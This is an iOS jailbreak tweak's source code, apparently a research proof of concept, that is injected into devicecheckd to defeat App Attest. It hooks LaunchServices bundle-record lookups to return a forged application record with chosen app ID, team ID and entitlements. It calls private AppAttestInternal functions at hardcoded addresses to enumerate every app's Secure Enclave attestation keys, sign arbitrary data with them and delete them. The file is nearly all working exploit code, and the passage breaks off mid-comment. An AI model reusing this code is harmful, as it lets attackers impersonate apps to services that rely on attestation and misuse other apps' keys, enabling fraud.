// OracledDCPatch — injected into devicecheckd via ElleKit.
//
// Thesis this exists to demonstrate: the Secure Enclave's guarantee (genuine
// key, genuine hardware) is completely separate from "is the calling app
// legitimately who it claims to be" - that legitimacy is enforced (if at all)
// by devicecheckd's DCClientHandler, a normal userspace daemon on the
// application processor. On a jailbroken device, AP-level code is fully
// attacker-controlled, so that policy is just... removed here.
//
// Confirmed via Frida recon: DCClientHandler's
// appAttestation{CreateKey,AttestKey,Assert}:...:completion: handlers take a
// leading arg1 that is NOT identity-bearing — corrected 2026-09-07 via oslog
// capture of genuine App A calls (see AGENTS.md): for ALL THREE selectors,
// a real call's arg1 is a plain __NSCFString UUID, byte-for-byte identical
// to `com.apple.DC.AppAttestAppUUID` in the calling app's own preferences
// plist — a per-installation correlation token the client-side
// DCAppAttestService library generates once and echoes back on every call.
// (Earlier revisions of this file guessed arg1 was a `DCContext` carrying
// `clientAppID`; that was wrong — DCContext's real role, if any, in this
// call path is still unknown.) Real identity is derived independently by
// devicecheckd via `_generateAppIDFromCurrentConnection` (audit-token
// based) — that's the correct thing to force.
//
// Forcing `_generateAppIDFromCurrentConnection` + `_isSupported` alone,
// WITHOUT touching arg1 at all, still fails for oracled's ad-hoc call —
// but the failure is a separate, structural one, not an identity check:
// oslog shows devicecheckd calling
// `+[LSBundleRecord _bundleRecordForAuditToken:checkNSBundleMainBundle:
// error:]` on the caller's REAL audit token (unrelated to anything our
// hooks return) and getting back NSOSStatusErrorDomain/-50, because oracled
// is a bare Mach-O tool with no LaunchServices bundle record at all — App
// A's genuine trace shows this same LaunchServices resolution succeeding
// (several `LSApplicationRecord` property lookups). This is the current
// open blocker; see AGENTS.md "Next session should" for candidate fixes
// (hooking LSBundleRecord's resolution directly vs. giving oracled a
// minimal ad-hoc-signed bundle shape).
#import "OracledDCCommon.h"
#import <objc/runtime.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <Security/Security.h>
#import <string.h>

// From libSandy (com.opa334.libsandy), the roothide fork. Declared inline
// (matching ~/repositories/geoshim's Tweak.x) so no header install is needed.
// We link with the symbol left UNDEFINED (-Wl,-U — no dev-stub .tbd was
// available), which means dyld only binds it against whatever's ALREADY
// loaded in the host process. Unlike an app process (where some other tweak
// commonly already pulls libsandy.dylib in), devicecheckd never loads it on
// its own -> calling this unbound symbol SIGABRTs devicecheckd (confirmed by
// isolating the call). Fix: dlopen the real dylib explicitly first.
extern int libSandy_applyProfile(const char *profileName);

// Set ONCE in %ctor (process-launch context). Calling libSandy_applyProfile
// again per-request (from devicecheckd's background XPC handling queue)
// reproducibly caused an internal failure there. Read-only elsewhere.
static int gSandyResult = -999;

// Diagnostic only — never mutates state, safe to leave installed. Logs
// every ivar (object ivars by -description, common scalar encodings by raw
// value) plus an NSKeyedArchiver dump of the object, walking up to (but not
// including) NSObject. This is what revealed arg1's real type (a plain
// per-app UUID string, not a DCContext) — see the file-header comment.
static void OracledDumpContext(id ctx, const char *label) {
    if (!ctx) {
        NSLog(@"[OracledDCPatch] %s: ctx is nil", label);
        return;
    }
    NSLog(@"[OracledDCPatch] %s: class=%@ desc=%@", label, NSStringFromClass([ctx class]), ctx);

    Class c = object_getClass(ctx);
    while (c && c != [NSObject class]) {
        unsigned int n = 0;
        Ivar *ivars = class_copyIvarList(c, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *name = ivar_getName(ivars[i]);
            const char *enc = ivar_getTypeEncoding(ivars[i]);
            if (enc && enc[0] == '@') {
                id v = object_getIvar(ctx, ivars[i]);
                NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %@", class_getName(c), name, enc, v);
            } else {
                ptrdiff_t off = ivar_getOffset(ivars[i]);
                char *p = (char *)(__bridge void *)ctx + off;
                switch (enc ? enc[0] : '?') {
                    case 'q': case 'l':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %ld", class_getName(c), name, enc, *(long *)p);
                        break;
                    case 'Q': case 'L':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %lu", class_getName(c), name, enc, *(unsigned long *)p);
                        break;
                    case 'i':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %d", class_getName(c), name, enc, *(int *)p);
                        break;
                    case 'I':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %u", class_getName(c), name, enc, *(unsigned int *)p);
                        break;
                    case 'B':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %d", class_getName(c), name, enc, (int)*(BOOL *)p);
                        break;
                    case 'c':
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = %d", class_getName(c), name, enc, (int)*(char *)p);
                        break;
                    default:
                        NSLog(@"[OracledDCPatch]   ivar %s.%s (%s) = <undecoded primitive>", class_getName(c), name, enc ?: "?");
                        break;
                }
            }
        }
        free(ivars);
        c = class_getSuperclass(c);
    }

    if ([ctx conformsToProtocol:@protocol(NSSecureCoding)] || [ctx respondsToSelector:@selector(encodeWithCoder:)]) {
        NSError *archErr = nil;
        NSData *archive = [NSKeyedArchiver archivedDataWithRootObject:ctx requiringSecureCoding:NO error:&archErr];
        if (archive) {
            id plist = [NSPropertyListSerialization propertyListWithData:archive
                                                                   options:NSPropertyListImmutable
                                                                    format:NULL
                                                                     error:nil];
            NSLog(@"[OracledDCPatch]   archive $objects = %@", plist[@"$objects"]);
        } else {
            NSLog(@"[OracledDCPatch]   archive failed: %@", archErr);
        }
    }
}

// arg1 for all three appAttestation* selectors is the same kind of value
// (see file header) — a plain per-app UUID string, not identity-bearing.
// If the real caller already supplied one, leave it alone (it's not a
// forgery target). If not (oracled has none yet for this forced identity),
// synthesize one and cache it per forced-app-id so a createKey->attestKey->
// assert sequence under the same forced identity stays internally
// consistent, mirroring com.apple.DC.AppAttestAppUUID's real per-install
// persistence semantics client-side.
static NSString *gCachedForcedAppID = nil;
static NSString *gCachedForcedUUID = nil;

static id OracledForceToken(id existingToken) {
    // IMPORTANT: capture the incoming param into its own local FIRST, before
    // calling OracledForcedAppID() or anything else. Reproducibly observed
    // that NOT doing so corrupts `existingToken` into unrelated garbage
    // (a real NSCFCharacterSet — plausibly from
    // NSCharacterSet.whitespaceAndNewlineCharacterSet formerly used in a trim
    // step) by the time it's read again. Root cause not fully understood;
    // capturing immediately reliably avoids it.
    id safeExisting = existingToken;
    NSString *forced = OracledForcedAppID();
    if (!forced) return safeExisting;
    if ([safeExisting isKindOfClass:[NSString class]]) return safeExisting;
    if (![forced isEqualToString:gCachedForcedAppID]) {
        gCachedForcedAppID = forced;
        gCachedForcedUUID = [[NSUUID UUID] UUIDString];
    }
    return gCachedForcedUUID;
}

// Ground truth (2026-09-07, via Frida class_getClassMethod +
// method_getTypeEncoding on the live devicecheckd process):
//   +[LSBundleRecord _bundleRecordForAuditToken:checkNSBundleMainBundle:error:]
//   encoding: @60@0:8{?=[8I]}16C48^@52
// i.e. a real C struct passed BY VALUE (not an opaque token object) —
// exactly `audit_token_t` from <bsm/audit.h> (8 x unsigned int), then a
// BOOL, then an NSError** out-param. Already defined transitively via
// <mach/message.h> (pulled in by Foundation) — no separate declaration
// needed here (redeclaring it caused a "typedef redefinition" build error).
//
// A genuine resolution (captured 2026-09-07 from a real App A call) showed
// `bundleIdentifier`/`teamIdentifier`/`applicationIdentifier`/`executableURL`
// are plain, directly-readable getters — but the returned LSApplicationRecord
// itself is a live handle into LaunchServices' real on-disk database
// (`_context`={LSContext="db"@"_LSDatabase"}, `_unitID`, `_tableID` ivars;
// most of its ~100 other properties are lazily resolved against that
// database on demand, e.g. `Invoking selector
// teamIdentifierWithContext:tableID:unitID:unitBytes:`). A hand-built
// LSApplicationRecord without a real backing db/unitID would risk breaking
// or crashing the moment anything touches one of those. So: never
// impersonate LSApplicationRecord itself. Instead, return an instance of a
// small class we own (OracledFakeBundleRecord below) that implements only
// the plain getters this call path actually reads. devicecheckd talks to
// the return value purely via dynamic `id`-typed message sends, so it can't
// tell the difference — and since it's not a real LSApplicationRecord, none
// of LaunchServices' database-backed lazy resolution is ever touched. Pure
// fabrication inside devicecheckd's own (fully compromised) process — no
// real audit token, no real bundle/database record, nothing borrowed from
// any actual installed app, per explicit instruction.
//
// UPGRADED 2026-09-08: subclass the REAL LSBundleRecord instead of bare
// NSObject. Rationale: extensive black-box tracing (file/sqlite/keychain/
// XPC/MobileGestalt/SecTask/__mac_syscall access, connection-caching --
// all ruled out) found no external data source behind the persistent
// "Application not eligible" (com.apple.appattest.error -4) result, which
// occurred identically whether forging a foreign identity (apptwo, no
// device provisioning) OR oracled's own genuinely-provisioned real identity
// (appone) -- ruling out anything about the CLAIMED identity string itself.
// The one lead not yet followed: earlier getter-tracing caught several
// `isKindOfClass:`/`respondsToSelector:` probes against our fake object
// with mixed YES/NO results. A bare NSObject can never pass
// `isKindOfClass:[LSBundleRecord class]` — if %orig's eligibility path
// gates on that (a structural "is this really a bundle record" check,
// independent of content), no amount of correct-looking property values
// could ever have passed it. Subclassing LSBundleRecord directly makes
// isKindOfClass/isMemberOfClass checks against it succeed via real
// inheritance, while our own getter overrides below still fully control
// the actual returned values. Not calling any of LSBundleRecord/LSRecord's
// own (unknown) designated initializers deliberately -- `+new` resolves to
// whatever plain `-init` the real class chain provides, which for a
// Foundation-style data class is normally a trivial NSObject-style no-op;
// +alloc zero-fills the instance either way, so inherited ivars we never
// touch start nil/zeroed and are safe to dealloc.
// LSBundleRecord lives in a private framework we don't link against, so a
// compile-time `@interface X : LSBundleRecord` fails at link time
// ("Undefined symbols _OBJC_CLASS_$_LSBundleRecord"). Build the subclass at
// RUNTIME instead, once the real class is loaded, via objc_allocateClassPair
// — identity data is stored per-instance via associated objects rather than
// @property/ivars (which would need class_addIvar before registration).
static const char *kFakeBundleRecordClassName = "OracledFakeBundleRecord";
static const void *kAppIdKey = &kAppIdKey;
static const void *kTeamIdKey = &kTeamIdKey;
static const void *kBundleIdKey = &kBundleIdKey;
static const void *kEntitlementsKey = &kEntitlementsKey;
static NSURL *gFakeExecutableURL = nil;

static NSString *FakeBundleRecord_applicationIdentifier(id self, SEL _cmd) {
    return objc_getAssociatedObject(self, kAppIdKey);
}
static NSString *FakeBundleRecord_teamIdentifier(id self, SEL _cmd) {
    return objc_getAssociatedObject(self, kTeamIdKey);
}
static NSString *FakeBundleRecord_bundleIdentifier(id self, SEL _cmd) {
    return objc_getAssociatedObject(self, kBundleIdKey);
}
static NSDictionary *FakeBundleRecord_entitlements(id self, SEL _cmd) {
    return objc_getAssociatedObject(self, kEntitlementsKey);
}
static NSURL *FakeBundleRecord_executableURL(id self, SEL _cmd) {
    return gFakeExecutableURL;
}
static NSString *FakeBundleRecord_description(id self, SEL _cmd) {
    return [NSString stringWithFormat:@"<OracledFakeBundleRecord appId=%@>",
            objc_getAssociatedObject(self, kAppIdKey)];
}
// Discovered via Frida objc_msgSend tracing (2026-09-08): a SECOND call site
// (inside _extractApplicationIdentifiers, past the IsEligibleApplication
// gate) resolves the bundle record again and then sends -isProfileValidated
// to it. We don't implement it, so it was falling through to the
// forwardInvocation: catch-all below — which lies about the return type
// ("@@:", id) for every selector regardless of the real one being forwarded,
// so a BOOL-returning method like this gets its return value packed/read
// with the wrong size. Give it a real, correctly-typed implementation
// instead of relying on the catch-all for anything that matters.
static BOOL FakeBundleRecord_isProfileValidated(id self, SEL _cmd) {
    return YES;
}
// Discovered via an actual crash report (2026-09-08,
// /var/mobile/Library/Logs/CrashReporter/devicecheckd-*.ips): the NEXT call
// in the same chain (_generateEnvironmentByAppSigning, right after the
// eligibility gate) is -[LSBundleRecord(MobileInstallation) isUPPValidated],
// also unimplemented on our fake class. This one doesn't silently misbehave
// like a bad forwardInvocation would — the real inherited LSRecord getter
// template (__LSRECORD_GETTER__<unsigned char>) asserts the record is still
// attached to a live LaunchServices database session before doing anything
// else, and our fake object never has one (nil _context/_node, deliberately
// — see OracledFakeBundleRecordClass above), so ANY inherited-but-not-
// overridden LSRecord/LSBundleRecord boolean getter hits
// __LSRECORD_IS_CRASHING_DUE_TO_A_CALLER_BUG__ and aborts the whole process
// (LIBSYSTEM/"Application Triggered Fault", not a normal ObjC exception —
// this is why hooking objc_exception_throw/abort/NSError construction all
// missed it; it's a deliberate os_crash-style hard fault, not a soft error).
// Same fix as isProfileValidated: give it a real override so it never falls
// through to the inherited implementation. If more of these turn up, the
// pattern is identical — add another BOOL override rather than debugging
// the crash from scratch each time.
static BOOL FakeBundleRecord_isUPPValidated(id self, SEL _cmd) {
    return YES;
}
// Discovered the same way (crash report + msgSend trace, 2026-09-08): the
// NEXT call, inside resolveAppAttestApplicationIdentifiersForApplicationRecord,
// is -appClipMetadata (an object-returning getter — checking whether the
// bundle is an App Clip, which affects app-id resolution). We aren't one,
// so nil (the same safe default as executableURL's sibling getters) is
// correct, not just crash-avoiding.
static id FakeBundleRecord_appClipMetadata(id self, SEL _cmd) {
    return nil;
}
// Confirmed via crash diagnostics (2026-09-08): calling the INHERITED
// -init (LSRecord/LSBundleRecord's own, never overridden by us) crashes
// devicecheckd outright — it dereferences internal state (_context/_node/
// etc.) that only a real designated initializer populates, and a plain
// objc_allocateClassPair + class_addMethod instance is zero-filled but
// otherwise untouched. Fix: override -init ourselves to skip the inherited
// implementation entirely. +alloc's zero-fill is all we need since we never
// rely on any inherited LSRecord machinery, only our own getters/associated
// objects.
static id FakeBundleRecord_init(id self, SEL _cmd) {
    return self;
}
// Catch-all safety net — only reached for a selector NEITHER we NOR the
// real LSBundleRecord/LSRecord hierarchy implement (ordinary inheritance
// already covers everything the real class provides, since this is a
// genuine subclass now — that's the whole point of subclassing over the
// bare-NSObject approach tried earlier).
static NSMethodSignature *FakeBundleRecord_methodSignatureForSelector(id self, SEL _cmd, SEL sel) {
    return [NSMethodSignature signatureWithObjCTypes:"@@:"];
}
static void FakeBundleRecord_forwardInvocation(id self, SEL _cmd, NSInvocation *invocation) {
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: unimplemented selector %@ -> returning nil",
          NSStringFromSelector(invocation.selector));
    id nilResult = nil;
    [invocation setReturnValue:&nilResult];
}

static Class OracledFakeBundleRecordClass(void) {
    Class existing = objc_getClass(kFakeBundleRecordClassName);
    if (existing) {
        NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: reusing existing class %p", existing);
        return existing;
    }
    // Ground truth (2026-09-08, via Frida objc_msgSend tracing during a live
    // createKey call): after +bundleRecordForAuditToken:error: returns
    // non-nil, AppAttest_AppAttestation_IsEligibleApplication's very next
    // call is [LSApplicationRecord class] — feeding an isKindOfClass: check
    // against the result. LSApplicationRecord is a SIBLING subclass of
    // LSBundleRecord (both inherit the same class methods from it), not an
    // ancestor — so a fake object whose superclass is LSBundleRecord itself
    // fails that check even though it's non-nil, producing the exact same
    // "-4 Application not eligible" as a genuine nil record. Subclassing
    // LSApplicationRecord instead satisfies isKindOfClass: while still
    // inheriting everything LSBundleRecord provides (LSApplicationRecord IS
    // one), so this is a strict widening, not a behavior change elsewhere.
    Class realBundleRecord = objc_getClass("LSApplicationRecord");
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: realBundleRecord=%p (%@)",
          realBundleRecord, realBundleRecord ? NSStringFromClass(realBundleRecord) : @"NOT FOUND");
    Class cls = objc_allocateClassPair(realBundleRecord ?: [NSObject class],
                                        kFakeBundleRecordClassName, 0);
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: objc_allocateClassPair -> %p", cls);
    if (!cls) {
        NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: allocateClassPair FAILED, aborting");
        return Nil;
    }
    BOOL ok1 = class_addMethod(cls, @selector(applicationIdentifier), (IMP)FakeBundleRecord_applicationIdentifier, "@@:");
    BOOL ok2 = class_addMethod(cls, @selector(teamIdentifier), (IMP)FakeBundleRecord_teamIdentifier, "@@:");
    BOOL ok3 = class_addMethod(cls, @selector(bundleIdentifier), (IMP)FakeBundleRecord_bundleIdentifier, "@@:");
    BOOL ok4 = class_addMethod(cls, @selector(entitlements), (IMP)FakeBundleRecord_entitlements, "@@:");
    BOOL ok5 = class_addMethod(cls, @selector(executableURL), (IMP)FakeBundleRecord_executableURL, "@@:");
    BOOL ok6 = class_addMethod(cls, @selector(description), (IMP)FakeBundleRecord_description, "@@:");
    BOOL ok7 = class_addMethod(cls, @selector(methodSignatureForSelector:), (IMP)FakeBundleRecord_methodSignatureForSelector, "@@::");
    BOOL ok8 = class_addMethod(cls, @selector(forwardInvocation:), (IMP)FakeBundleRecord_forwardInvocation, "v@:@");
    BOOL ok9 = class_addMethod(cls, @selector(init), (IMP)FakeBundleRecord_init, "@@:");
    BOOL ok10 = class_addMethod(cls, @selector(isProfileValidated), (IMP)FakeBundleRecord_isProfileValidated, "B@:");
    BOOL ok11 = class_addMethod(cls, @selector(isUPPValidated), (IMP)FakeBundleRecord_isUPPValidated, "B@:");
    BOOL ok12 = class_addMethod(cls, @selector(appClipMetadata), (IMP)FakeBundleRecord_appClipMetadata, "@@:");
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecord: class_addMethod results = [%d %d %d %d %d %d %d %d %d %d %d %d]",
          ok1, ok2, ok3, ok4, ok5, ok6, ok7, ok8, ok9, ok10, ok11, ok12);
    objc_registerClassPair(cls);
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecord registered, superclass=%@",
          NSStringFromClass(class_getSuperclass(cls)));
    return cls;
}

static id OracledFakeBundleRecordFor(NSString *forcedAppId) {
    NSRange dot = [forcedAppId rangeOfString:@"."];
    NSString *team = dot.location != NSNotFound ? [forcedAppId substringToIndex:dot.location] : forcedAppId;
    NSString *bundle = dot.location != NSNotFound ? [forcedAppId substringFromIndex:dot.location + 1] : @"";
    if (!gFakeExecutableURL) {
        // Confirmed via `open`/`stat` tracing (2026-09-07): a fabricated
        // per-bundle path (e.g. under /var/containers/Bundle/Application/
        // <uuid>/) reliably does NOT exist on disk, and a new libSandy grant
        // for it can't work for the same jbroot-mismatch reason the forge
        // file itself had. Point at a real, always-stat-able path
        // devicecheckd can already read without any special grant — its own
        // binary, under /System/Library (world-readable). Confirmed via
        // Process.mainModule.path from inside devicecheckd itself. Not a
        // borrowed credential — just a convenient, definitely-real inode;
        // its content is never read or attested to, only its existence
        // checked.
        gFakeExecutableURL = [NSURL fileURLWithPath:
            @"/System/Library/PrivateFrameworks/DeviceCheckInternal.framework/devicecheckd"];
    }
    Class fakeCls = OracledFakeBundleRecordClass();
    id allocated = [fakeCls alloc];
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecordFor: cls=%p alloc=%p", fakeCls, allocated);
    id fake = [allocated init];
    NSLog(@"[OracledDCPatch] OracledFakeBundleRecordFor: after init -> %p (class=%@)",
          fake, fake ? NSStringFromClass([fake class]) : @"nil");
    objc_setAssociatedObject(fake, kAppIdKey, forcedAppId, OBJC_ASSOCIATION_RETAIN);
    objc_setAssociatedObject(fake, kTeamIdKey, team, OBJC_ASSOCIATION_RETAIN);
    objc_setAssociatedObject(fake, kBundleIdKey, bundle, OBJC_ASSOCIATION_RETAIN);
    // Plausible entitlements for the forged identity — App Attest capability
    // "on", matching what a real eligibility check reads off an entitled
    // app's record (com.apple.developer.devicecheck.appattest-environment).
    // The environment value now follows the forge file's line 2
    // (OracledForcedEnvironment(), written by oracled.m from POST /keys'
    // `environment` field) — it was a hardcoded @"development" before, which
    // was the ONLY thing deciding the AAGUID environment (a live
    // environment:"production" mint came back appattestdevelop, 2026-10-10).
    objc_setAssociatedObject(fake, kEntitlementsKey, @{
        @"application-identifier": forcedAppId,
        @"com.apple.developer.team-identifier": team,
        @"com.apple.developer.devicecheck.appattest-environment": OracledForcedEnvironment(),
    }, OBJC_ASSOCIATION_RETAIN);
    return fake;
}

%hook LSBundleRecord

+ (id)_bundleRecordForAuditToken:(audit_token_t)token
             checkNSBundleMainBundle:(BOOL)check
                                error:(NSError **)error {
    NSString *forced = OracledForcedAppID();
    if (forced) {
        id fake = OracledFakeBundleRecordFor(forced);
        if (error) *error = nil;
        NSLog(@"[OracledDCPatch] LSBundleRecord FORGED (no real resolution attempted) for appId=%@ -> %@",
              forced, fake);
        return fake;
    }

    // Real caller (no forge active) — pass through to %orig completely
    // unmodified, as always. This dump is what revealed the real shape
    // above; left in for future reference/comparison, not load-bearing.
    id result = %orig;
    NSLog(@"[OracledDCPatch] LSBundleRecord audit=[%u %u %u %u %u %u %u %u] check=%d -> class=%@ err=%@",
          token.val[0], token.val[1], token.val[2], token.val[3],
          token.val[4], token.val[5], token.val[6], token.val[7],
          check, result ? NSStringFromClass([result class]) : nil,
          error ? *error : nil);
    return result;
}

// Ground truth (2026-09-08, via Frida class_getClassMethod on the live
// devicecheckd process): +[LSBundleRecord bundleRecordForAuditToken:error:]
//   encoding: @56@0:8{?=[8I]}16^@48
// Same audit_token_t-by-value convention as the private selector above,
// just missing the checkNSBundleMainBundle: BOOL.
//
// This is the REAL gate: static analysis of AppAttestInternal.framework
// (Ghidra, 2026-09-08) showed AppAttest_AppAttestation_IsEligibleApplication
// calls exactly this selector — NOT the private 3-arg one above — on the
// caller's raw audit token, and returns "Application not eligible" (-4)
// whenever it comes back nil. Since it resolves the bundle record for the
// audit token's REAL owning process (devicecheckd itself, a daemon with no
// app bundle), it is nil unconditionally, regardless of anything forged
// downstream — which is exactly why identity forgery alone never moved
// this error. Forging here is what closes the gap.
+ (id)bundleRecordForAuditToken:(audit_token_t)token
                           error:(NSError **)error {
    NSString *forced = OracledForcedAppID();
    if (forced) {
        id fake = OracledFakeBundleRecordFor(forced);
        if (error) *error = nil;
        NSLog(@"[OracledDCPatch] LSBundleRecord (public selector) FORGED for appId=%@ -> %@",
              forced, fake);
        return fake;
    }

    id result = %orig;
    NSLog(@"[OracledDCPatch] LSBundleRecord (public selector) audit=[%u %u %u %u %u %u %u %u] -> class=%@ err=%@",
          token.val[0], token.val[1], token.val[2], token.val[3],
          token.val[4], token.val[5], token.val[6], token.val[7],
          result ? NSStringFromClass([result class]) : nil,
          error ? *error : nil);
    return result;
}

%end

#pragma mark - list/sign/delete every App Attest key resident on the device
//
// Motivation (2026-09-08): forging our own identity (e.g. apptwo) to mint a
// key isn't itself a demonstrated weakness — oracled could just legitimately
// act as apptwo, since we hold that entitlement ourselves. The actual
// interesting claim is structural: AppAttestInternal stores EVERY App
// Attest private key on the device — regardless of which app created it —
// under ONE shared keychain service ("com.apple.appattest.identities"),
// addressed by an opaque SHA256-derived label, with no per-app keychain
// access-group isolation visible to devicecheckd itself. Since this whole
// project's exploit is "devicecheckd's own process is fully compromised,"
// that means every App Attest key ever minted on this device — by any app, real
// identity or forged — is reachable from here, not just our own. This is
// what backs oracled's ENTIRE `/keys` resource now (list, sign, delete) —
// there is no separate in-memory record of "keys oracled itself minted";
// every key on the device, including ones this process just created, is
// addressed the same way, by this same opaque label.
//
// Confirmed via Ghidra decompilation of AppAttestInternal.framework
// (2026-09-08):
//   - `_getAllCredentialKeychainLabels(void) -> NSArray<NSString*>*` already
//     exists as Apple's own private helper (used by `_removeAllKeychain
//     ItemsForMissingApps`'s cleanup logic) — it enumerates literally every
//     item under the shared "com.apple.appattest.identities" keychain
//     service via `_copy_all_items`, filters to `aa_`-prefixed labels, and
//     returns the array. We call it directly.
//   - `_copy_keychain_item(CFStringRef service, CFStringRef label, int
//     *status, CFTypeRef *out) -> CFTypeRef` fetches ONE item by its EXACT
//     label string, returning a live, usable SecKeyRef — this is the SAME
//     function `_loadCredentialKeychain` uses internally after rebuilding a
//     label from (environment, appUUID, identifierB, credentialId). We
//     don't need to reconstruct any of those identity components: since
//     `_getAllCredentialKeychainLabels` already gives us the exact label
//     string verbatim, we can call `_copy_keychain_item` with a HARVESTED
//     label directly and get back the same live SecKeyRef, regardless of
//     which app's identity produced that label.
//   - Confirmed live (Frida, real createKey call): the key created here IS
//     genuinely Secure-Enclave-resident, not seeded — SecKeyCreateRandomKey
//     is called with `tkid = "com.apple.setoken"`, the resulting SecKeyRef
//     carries a 314-byte SE token-object-id blob and `extr = 0`, and
//     SecKeyCopyExternalRepresentation on it fails with the canonical
//     "export not implemented for key <SecKeyRef:('com.apple.setoken')...>"
//     — exactly the behavior a real hardware-backed key exhibits and a
//     software/seeded key would not.
//
// Both functions are PRIVATE (non-exported) symbols — dlsym can't find them
// from our injected dylib, so we call them by address instead. The
// addresses below are AppAttestInternal's own STATIC (dyld_shared_cache
// preferred/unslid) vmaddrs, taken directly from Ghidra after importing the
// framework out of this device's cache (iOS 15.8.8 / 19H422). At runtime we
// resolve the ACTUAL ASLR slide for AppAttestInternal via
// `_dyld_get_image_vmaddr_slide` (found by matching the loaded image path)
// rather than hardcoding a computed slide number — this is what the
// slide-verification mistake earlier this session (off by 4 bytes from a
// manually-computed value) argued for: let dyld tell us the slide, don't
// compute it by hand from two addresses.
//
// These are hardcoded static offsets into ONE specific dyld_shared_cache
// build — they WILL break (wrong function called, or a bad address) on any
// other iOS version. Exact device/build these were extracted from and are
// still verified against: iPad5,1 (iPad mini 4, A8), iOS/iPadOS 15.8.8,
// build 19H422.
#define AAI_STATIC_getAllCredentialKeychainLabels    0x1c32d27d0UL
#define AAI_STATIC_copy_keychain_item                0x1c32ce19cUL
#define AAI_STATIC_deleteCredentialKeychainWithLabel 0x1c32d2728UL

typedef id (*OracledGetAllCredentialKeychainLabelsFn)(void);
typedef long (*OracledCopyKeychainItemFn)(id service, id label, int *status, void **out);
typedef int (*OracledDeleteCredentialKeychainWithLabelFn)(id label);

static intptr_t OracledAppAttestInternalSlide(void) {
    static intptr_t cachedSlide = 0;
    static BOOL resolved = NO;
    if (resolved) return cachedSlide;
    uint32_t count = _dyld_image_count();
    for (uint32_t i = 0; i < count; i++) {
        const char *name = _dyld_get_image_name(i);
        if (name && strstr(name, "AppAttestInternal.framework/AppAttestInternal")) {
            cachedSlide = _dyld_get_image_vmaddr_slide(i);
            resolved = YES;
            NSLog(@"[OracledDCPatch] AppAttestInternal slide resolved: %p (image #%u, %s)",
                  (void *)cachedSlide, i, name);
            return cachedSlide;
        }
    }
    NSLog(@"[OracledDCPatch] WARNING: AppAttestInternal image not found in _dyld_image_count() list — slide unresolved");
    resolved = YES; // don't rescan every call if it's genuinely not loaded yet
    return 0;
}

#define AAI_LIVE(staticAddr) ((void *)((uintptr_t)(staticAddr) + OracledAppAttestInternalSlide()))

// Sentinels smuggled through the existing Assert XPC completion channel —
// same trick AppAttestInternal's own hidden `__debug_aa_kc_list__`/
// `__debug_aa_kc_cleanup__` keyId strings use (see
// AppAttest_AppAttestation_Assert, gated there behind
// os_variant_allows_internal_security_policies — which returns false on
// this non-internal device, hence rolling our own instead of relying on
// theirs). No new XPC method, no new IPC file: oracled's existing
// `dcAssert(keyId, cdh, &err)` wrapper already sends an arbitrary keyId
// string and gets back whatever NSData/NSError the completion produces —
// these hooks intercept BEFORE %orig and answer directly.
static void OracledHandleListSEKeys(id completion) {
    OracledGetAllCredentialKeychainLabelsFn fn =
        (OracledGetAllCredentialKeychainLabelsFn)AAI_LIVE(AAI_STATIC_getAllCredentialKeychainLabels);
    id labels = fn();
    NSLog(@"[OracledDCPatch] SE key enumeration -> %@", labels);

    NSError *jsonErr = nil;
    NSData *json = [NSJSONSerialization dataWithJSONObject:@{@"keys": labels ?: @[]}
                                                     options:0 error:&jsonErr];
    void (^block)(id, id) = completion;
    block(json, jsonErr);
}

static void OracledHandleSignArbitraryKey(NSString *label, NSData *clientDataHash, id completion) {
    void (^block)(id, id) = completion;

    OracledCopyKeychainItemFn copyFn =
        (OracledCopyKeychainItemFn)AAI_LIVE(AAI_STATIC_copy_keychain_item);
    int status = -1;
    void *errOut = NULL;
    long rawKeyRef = copyFn(@"com.apple.appattest.identities", label, &status, &errOut);
    NSLog(@"[OracledDCPatch] arbitrary-key lookup label=%@ status=%d rawKeyRef=0x%lx",
          label, status, rawKeyRef);

    if (rawKeyRef == 0) {
        if (errOut) CFRelease(errOut); // _copy_keychain_item's own bridged+retained error, unused here
        NSError *err = [NSError errorWithDomain:@"xyz.regulad.oracled.se"
                                            code:status
                                        userInfo:@{NSLocalizedDescriptionKey: @"no keychain item for that label"}];
        block(nil, err);
        return;
    }

    SecKeyRef key = (SecKeyRef)rawKeyRef;
    CFErrorRef cfErr = NULL;
    // Signs the caller's clientDataHash directly (not AppAttest's own
    // authenticatorData+clientDataHash-then-SHA256 composite from
    // _generateAssertionObject) — this is a raw proof-of-possession
    // signature over arbitrary attacker-supplied bytes using a key that
    // belongs to (potentially) a completely different app's identity, which
    // is the actual point being demonstrated.
    CFDataRef sig = SecKeyCreateSignature(key, kSecKeyAlgorithmECDSASignatureMessageX962SHA256,
                                           (__bridge CFDataRef)clientDataHash, &cfErr);
    CFRelease(key);
    if (!sig) {
        NSError *err = CFBridgingRelease(cfErr);
        NSLog(@"[OracledDCPatch] arbitrary-key sign FAILED: %@", err);
        block(nil, err);
        return;
    }
    NSData *sigData = CFBridgingRelease(sig);
    NSLog(@"[OracledDCPatch] arbitrary-key sign OK, %lu bytes", (unsigned long)sigData.length);
    block(sigData, nil);
}

// Ground truth (2026-09-08, live Frida call against a real label on
// devicecheckd): `_deleteCredentialKeychainWithLabel(label) -> BOOL` returns
// TRUE (1) both when the label existed and was actually removed AND when it
// was already gone (confirmed: 1st call on a real label -> 1, item
// genuinely gone from a fresh _getAllCredentialKeychainLabels() listing
// afterward; 2nd call on that now-deleted label -> ALSO 1). This traces back
// to _delete_keychain_item's own decompiled logic, which treats
// SecItemDelete's real success (OSStatus 0) and errSecItemNotFound
// (-25300) as equally successful outcomes — idempotent-delete semantics,
// not "did something actually get removed." So FALSE (0) here means a
// genuine unexpected failure, not "not found" — there is no reliable way to
// distinguish "deleted" from "was already gone" via this return value
